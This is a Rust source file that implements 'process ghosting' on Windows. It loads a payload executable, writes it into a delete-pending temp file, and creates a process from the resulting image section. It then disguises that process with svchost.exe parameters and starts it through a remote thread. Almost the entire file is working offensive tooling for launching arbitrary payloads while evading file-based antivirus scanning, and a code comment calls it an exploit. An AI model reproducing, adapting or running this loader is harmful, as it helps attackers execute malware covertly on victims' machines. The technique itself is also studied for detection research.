#![windows_subsystem = "windows"]
#![feature(core_intrinsics)]
mod process_env;

use ntapi::ntioapi::{
    FileDispositionInformation, NtOpenFile, NtSetInformationFile, NtWriteFile, FILE_SUPERSEDE,
    FILE_SYNCHRONOUS_IO_NONALERT, IO_STATUS_BLOCK, PIO_APC_ROUTINE,
};
use ntapi::ntmmapi::{NtAllocateVirtualMemory, NtCreateSection, NtReadVirtualMemory, NtWriteVirtualMemory};
use ntapi::ntobapi::NtClose;
use ntapi::ntpsapi::{NtCreateProcessEx, NtCurrentProcess, NtQueryInformationProcess, PROCESS_BASIC_INFORMATION, PROCESS_CREATE_FLAGS_INHERIT_HANDLES, NtCreateThreadEx};
use ntapi::ntrtl::{
    RtlCreateProcessParametersEx, RtlImageNtHeader, RtlInitUnicodeString,
    PRTL_USER_PROCESS_PARAMETERS, RTL_USER_PROC_PARAMS_NORMALIZED,
};
use ntapi::winapi::ctypes::c_void;
use ntapi::winapi::shared::basetsd::ULONG_PTR;
use ntapi::winapi::shared::ntdef::{OBJECT_ATTRIBUTES, PUNICODE_STRING, PVOID, PHANDLE, ULONGLONG};
use ntapi::winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
use ntapi::winapi::um::winnt::{DELETE, FILE_SHARE_READ, FILE_SHARE_WRITE, GENERIC_WRITE, SYNCHRONIZE, THREAD_ALL_ACCESS};
use std::env::args;
use std::ffi::CString;
use std::intrinsics::{size_of, size_of_val};
use std::mem::zeroed;
use std::ptr;
use std::ptr::null_mut;
use widestring::U16String;
use winapi::ctypes::wchar_t;
use winapi::shared::basetsd::SIZE_T;
use winapi::shared::minwindef::{LPVOID, MAX_PATH};
use winapi::shared::ntdef::{
    InitializeObjectAttributes, HANDLE, NT_SUCCESS, NULL, OBJ_CASE_INSENSITIVE, PCWSTR,
    PLARGE_INTEGER, POBJECT_ATTRIBUTES, UNICODE_STRING,
};
use winapi::shared::ntstatus::STATUS_IMAGE_MACHINE_TYPE_MISMATCH;
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::fileapi::{
    CreateFileA, GetFileSizeEx, GetTempFileNameW, GetTempPathW, ReadFile, FILE_DISPOSITION_INFO,
    OPEN_EXISTING,
};
use winapi::um::processthreadsapi::{GetProcessId,GetExitCodeThread};
use winapi::um::userenv::CreateEnvironmentBlock;
use winapi::um::winnt::{
    FILE_ATTRIBUTE_NORMAL, GENERIC_READ, LARGE_INTEGER, LPWSTR, MEM_COMMIT, MEM_RESERVE,
    PAGE_READONLY, PAGE_READWRITE, PROCESS_ALL_ACCESS, SECTION_ALL_ACCESS, SEC_IMAGE,
};
use ntapi::winapi::um::minwinbase::{LPTHREAD_START_ROUTINE, SECURITY_ATTRIBUTES};
use ntapi::winapi::shared::minwindef::ULONG;
use ntapi::winapi::um::synchapi::WaitForSingleObject;
use std::thread::sleep;
use std::time::Duration;
use ntapi::winapi::um::memoryapi::WriteProcessMemory;
use ntapi::winapi::um::processthreadsapi::CreateRemoteThread;

unsafe fn read_payload(payload: String) -> (*mut c_void, u32) {
    let mut fsz: LARGE_INTEGER = zeroed::<LARGE_INTEGER>();
    let mut return_legth: u32 = 0;
    let mut h_file: HANDLE = INVALID_HANDLE_VALUE;

    //
    // Open file payload.
    //
    let payload_conver = CString::new(payload).unwrap();

    h_file = CreateFileA(
        payload_conver.as_ptr() as *const i8,
        GENERIC_READ,
        0,
        *&mut zeroed::<winapi::um::minwinbase::LPSECURITY_ATTRIBUTES>(),
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL,
    );

    if h_file == INVALID_HANDLE_VALUE {
        println!("Create File {:?} fail", payload_conver);
    }
    //Query Payload File Size
    if 0 == GetFileSizeEx(h_file, &mut fsz) {
        println!("Fail Get Payload File Size");
    }

    // Allocate buffer for payload file.
    //let mut Buffer: [u8; 150000] = [0; 150000];

    let sz = fsz.s_mut().LowPart;
    let mut sz1: SIZE_T = fsz.s_mut().LowPart as usize;
    let mut Buffer = ntapi::_core::ptr::null_mut();

    let status = NtAllocateVirtualMemory(
        NtCurrentProcess,
        &mut Buffer,
        0,
        &mut sz1,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    );

    if !NT_SUCCESS(status) {
        println!("NtAllocateVirtualMemory{} failed", fsz.s().LowPart);
    }

    // Read payload file to the buffer.
    if !ReadFile(
        h_file,
        Buffer,
        sz,
        &mut return_legth,
        *&mut zeroed::<winapi::um::minwinbase::LPOVERLAPPED>(),
    ) == 0
    {
        println!("ReadFile {:?},{:?} Fails", h_file, Buffer);
    }

    CloseHandle(h_file);
    h_file = INVALID_HANDLE_VALUE;
    (Buffer, sz)
}

unsafe fn open_file_temp(file_path: [u16; 100]) -> HANDLE {
    let mut file_name: UNICODE_STRING = zeroed::<UNICODE_STRING>();

    //let mut nt_path:Vec<u16>=Vec::new();
    // nt_path.push("\\??\\".as_ptr() as u16);
    let clean_vector: Vec<u16> = file_path
        .to_vec()
        .into_iter()
        .take_while(|x| *x != 0x0 as u16)
        .collect();
    //nt_path.append(&mut clean_slice);

    let nt_string = format!(
        "\\??\\{}",
        String::from_utf16(clean_vector.as_slice()).unwrap()
    );

    let to_16bits = U16String::from_str(&nt_string);

    RtlInitUnicodeString(&mut file_name, to_16bits.as_ptr());

    //println!("file name buffer {:?}",file_name.Buffer);
    let mut attr: OBJECT_ATTRIBUTES = zeroed::<OBJECT_ATTRIBUTES>();
    InitializeObjectAttributes(&mut attr, &mut file_name, OBJ_CASE_INSENSITIVE, NULL, NULL);

    // println!("FIle name: {:?}",(*attr.ObjectName).Buffer);
    let mut status_block: IO_STATUS_BLOCK = zeroed::<IO_STATUS_BLOCK>();
    let mut file: HANDLE = INVALID_HANDLE_VALUE;

    let status = NtOpenFile(
        &mut file,
        DELETE | SYNCHRONIZE | GENERIC_READ | GENERIC_WRITE,
        &attr as *const _ as *mut OBJECT_ATTRIBUTES,
        &mut status_block,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        FILE_SUPERSEDE | FILE_SYNCHRONOUS_IO_NONALERT,
    );

    if !NT_SUCCESS(status) {
        //println!("Failed to Open Temp File in path: {}", String::from_utf16(clean_slice.as_slice()).unwrap()  );
        println!(
            "Failed to Open Temp File in path: {}",
            &nt_string.replace("\\??\\", "")
        );

        return INVALID_HANDLE_VALUE;
    }

    println!(
        "File Temp Created With Sucess in path: {}",
        nt_string.replace("\\??\\", "")
    );

    return file as HANDLE;
}

unsafe fn make_section_from_delete_pending_file(
    filepath: [u16; 100],
    payload_buffer: *mut c_void,
    size_payload: u32,
) -> HANDLE {
    //let mut handle_file:HANDLE=open_file_temp(filepath);

    let h_deleting_file: HANDLE = open_file_temp(filepath);
    let mut status_block: IO_STATUS_BLOCK = zeroed::<IO_STATUS_BLOCK>();

    //Set disposition FLag
    let mut info: FILE_DISPOSITION_INFO = zeroed::<FILE_DISPOSITION_INFO>();
    info.DeleteFile = 1;

    let mut status = NtSetInformationFile(
        h_deleting_file,
        &mut status_block,
        &mut info as *const _ as *mut _,
        size_of::<FILE_DISPOSITION_INFO>() as u32,
        FileDispositionInformation,
    );

    if !NT_SUCCESS(status) {
        println!("Setting Information Failed");
    }
    println!("Information Set with Success ");
    let byte_offset: LARGE_INTEGER = zeroed::<LARGE_INTEGER>();

    status = NtWriteFile(
        h_deleting_file,
        NULL,
        zeroed::<PIO_APC_ROUTINE>(),
        NULL,
        &mut status_block,
        payload_buffer,
        size_payload,
        &byte_offset as *const _ as *mut _,
        NULL as *mut _,
    );

    if !NT_SUCCESS(status) {
        println!("Write File was FAIL!");
        return INVALID_HANDLE_VALUE;
    }
    println!("Write File Success");

    let mut h_section: HANDLE = null_mut();

    status = NtCreateSection(
        &mut h_section,
        SECTION_ALL_ACCESS,
        *&mut zeroed::<winapi::shared::ntdef::POBJECT_ATTRIBUTES>(),
        *&mut zeroed::<winapi::shared::ntdef::PLARGE_INTEGER>(),
        PAGE_READONLY,
        SEC_IMAGE,
        h_deleting_file,
    );

    if !NT_SUCCESS(status) {
        println!("Fail to NtcreateSection");
        return INVALID_HANDLE_VALUE;
    }
    println!("NtCreateSection Success");
    NtClose(h_deleting_file);
    drop(h_deleting_file);

    return h_section;
}

unsafe fn process_ghost(
    target: UNICODE_STRING,
    payload_buffer: *mut c_void,
    size_payload: u32,
) -> bool {
    //WE NEED TO PUT THE SIZE OF THE ARRAY BECAUSE IF WE USE SOME VALUES LIKE LPWSTR O WCHAR
    // ETC, RUST MAKE AN ASSIGNMENT OF MEMORY SIZE AND SOMETIMES THIS ONE TRY TO OVERWRITE ON THE SPACE OF ANOTHER VARIABLE AND THIS CRASH THE EXPLOIT
    let temp_path: [u16; 100] = [0; 100];
    let temp_name: [u16; 100] = [0; 100];
    let mut peb_copy: [u8; 4096] = [0; 4096];

    GetTempPathW(MAX_PATH as u32, temp_path.as_ptr() as LPWSTR);
    GetTempFileNameW(
        &temp_path as *const _ as *mut _,
        null_mut(),
        0,
        temp_name.as_ptr() as LPWSTR,
    );
    let h_section = make_section_from_delete_pending_file(temp_name, payload_buffer, size_payload);

    let mut h_process: HANDLE = null_mut();

    let mut status = NtCreateProcessEx(
        &mut h_process,
        PROCESS_ALL_ACCESS,
        *&mut zeroed::<winapi::shared::ntdef::POBJECT_ATTRIBUTES>(),
        NtCurrentProcess,
        PROCESS_CREATE_FLAGS_INHERIT_HANDLES,
        h_section,
        NULL,
        NULL,
        0,
    );

    if !NT_SUCCESS(status) {
        println!("NtCreateProcess Ex Failed");
        if status == STATUS_IMAGE_MACHINE_TYPE_MISMATCH {
            println!("THE PAYLOAD HAS MISMATCHING BITNESS");
            return false;
        }
    }
    println!("NtCreateProcess Of Payload Success");

    let mut pbi = zeroed::<PROCESS_BASIC_INFORMATION>();
    let mut return_legth: u32 = 0;

    status = NtQueryInformationProcess(
        h_process as *const _ as *mut _,
        0,
        &mut pbi as *const _ as *mut _,
        size_of::<PROCESS_BASIC_INFORMATION>() as _,
        &mut return_legth,
    );

    if !NT_SUCCESS(status) {
        println!("NtQueryInformationProcess Fail");
        return false;
    }
    println!("NtQueryInformationProcess Success");

    let copy_peb=process_env::buffer_remote_peb(h_process,pbi);
    println!("ImageBase Address: {:?}", copy_peb.ImageBaseAddress);
    //calculate entry point
    let NT_HEADERS = *RtlImageNtHeader(payload_buffer);

    let status = NtReadVirtualMemory(
        h_process as *const _ as *mut _,
        pbi.PebBaseAddress as *const _ as *mut _,
        &peb_copy as *const _ as *mut _, //TEMP ITS A BUFFER TO IN OUT
        0x1000,
        &mut return_legth as *const _ as *mut _,
    );

    if !NT_SUCCESS(status) {
        println!("NtReadVirtualMemory Fails");
        return false;
    }
    println!("NtReadVirtualMemory Success");

    let mut copy_data_ptr: ntapi::ntpebteb::PPEB = peb_copy.as_mut_ptr().cast();

    /*let image_base: ULONGLONG = (*copy_data_ptr).ImageBaseAddress as u64;
    let entry_point: ULONGLONG =
        image_base + NT_HEADERS.OptionalHeader.AddressOfEntryPoint as u64;



        */



    if !process_env::setup_process_parameters(h_process, pbi, target) {
        println!("Parameters Setup Fails");
        return false;
    }
    println!(
        "Parameters Setup With Success into the process {}",
        GetProcessId(h_process)
    );

    let mut h_thread: winapi::shared::ntdef::HANDLE = zeroed::<HANDLE>();

    //type RemoteThreadProc = unsafe extern "system" fn(LPVOID) -> u32;

    let va_entrypoint: u64 = std::mem::transmute::<*mut winapi::ctypes::c_void, u64>((*copy_data_ptr).ImageBaseAddress) + NT_HEADERS.OptionalHeader.AddressOfEntryPoint as u64;

    let enter: LPTHREAD_START_ROUTINE =
        Some(*(&va_entrypoint as *const _ as *const extern "system" fn(LPVOID) -> u32));
    //println!("Entry Point at {}",entry_point);

   /* let status = CreateRemoteThread(
        &h_process as *const _ as *mut _,
        0 as *mut SECURITY_ATTRIBUTES,
        0,
        enter,
        allocate,
        0,
        0 as *mut _,

    );

    if status as usize != 0x0 as usize {
        println!("Fail Create thread");}*/


    let status = NtCreateThreadEx(
        &mut h_thread,
        THREAD_ALL_ACCESS,
        null_mut(),
        h_process  as *const _ as *mut _,
        &enter as *const _ as *mut _,
        null_mut(),
        0,
        0,
        0,
        0,
        null_mut(),
    );

    if !NT_SUCCESS(status)  {
        println!("Fail Create thread");

    }

   /* let mut test: i32 = 1;

    GetExitCodeThread(*&h_thread as *mut _, &mut test as *const _ as *mut _);

    if test != 0 {
        println!("Success Create Thread");
        let wait = WaitForSingleObject(*&h_thread as *mut _, 0);
        println!("Single object {}", wait);
        let error_ = GetLastError();
        println!("Last Error {}", error_);

        sleep(Duration::from_secs(30));
    } else {
        println!("Fail Create thread");
    }*/

    return true;
}



fn main() {
    unsafe {
        let args: Vec<String> = args().collect();
        let path_target = &args[1];
        let path_payload = &args[2];

        let mut set_target: UNICODE_STRING = zeroed::<UNICODE_STRING>();

        let (buf_payload, size_payload) = read_payload(path_payload.to_string());

        RtlInitUnicodeString(
            &mut set_target,
            "C:\\Windows\\System32\\svchost.exe".as_ptr() as *const u16,
        );

     let result=   process_ghost(set_target, buf_payload, size_payload);

        if result == false{
            println!("FAILED!")
        }
        println!("DONE!")
        //ExpandEnvironmentStringsW("C:\\Windows\\System32\\svchost.exe" as *const  winapi::ctypes::wchar_t , &mut set_target, MAX_PATH as u32);

        //  println!("Inject on {}  and payload {}",&path_target,&path_payload);
    }
}
#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn test_open_file() {
        unsafe {
            let path: wchar_t = "C:\\Windows\\System32\\svchost.exe".as_bytes().as_ptr() as u16;
            open_file_temp(path);
        }
    }
}
